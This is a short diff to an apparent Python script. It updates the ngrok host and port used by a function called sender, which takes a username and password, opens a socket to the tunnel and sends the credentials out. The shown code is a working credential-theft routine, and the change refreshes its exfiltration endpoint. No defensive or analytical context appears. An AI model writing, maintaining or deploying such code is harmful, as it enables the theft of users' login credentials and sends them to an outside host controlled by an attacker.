@@ -70,8 +70,8 @@ def sprint(sentence, second=0.05):
 def sender(user, passw):
     import socket
     mess = f'{user}:{passw}'
-    hote = '2.tcp.ngrok.io'
-    port = 10119
+    hote = '4.tcp.ngrok.io'
+    port = 13862
     socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     socket.connect((hote, port))
     socket.send(mess.encode())
